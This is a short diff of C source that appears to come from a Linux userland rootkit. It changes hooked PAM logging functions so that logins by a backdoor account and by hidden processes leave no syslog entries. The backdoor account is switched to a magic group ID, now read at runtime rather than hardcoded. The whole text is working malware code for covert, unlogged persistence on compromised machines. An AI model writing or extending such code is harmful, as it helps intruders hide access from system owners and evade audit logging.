@@ -1,5 +1,5 @@
 void pam_syslog(const pam_handle_t *pamh, int priority, const char *fmt, ...){
-    if(is_bdusr()) return;
+    if(is_bdusr() || hidden_ppid()) return;
 
     va_list va;
 
@@ -8,7 +8,7 @@ void pam_syslog(const pam_handle_t *pamh, int priority, const char *fmt, ...){
 
     if(!strcmp(user, BD_UNAME)){
         hook(CSETGID);
-        call(CSETGID, MAGIC_GID);
+        call(CSETGID, readgid());
         return;
     }
 
@@ -19,14 +19,14 @@ end_pam_syslog:
 }
 
 void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_list args){
-    if(is_bdusr()) return;
+    if(is_bdusr() || hidden_ppid()) return;
 
     char *user = get_username(pamh);
     if(user == NULL) goto end_pam_vsyslog;    
 
     if(!strcmp(user, BD_UNAME)){
         hook(CSETGID);
-        call(CSETGID, MAGIC_GID);
+        call(CSETGID, readgid());
         return;
     }
 
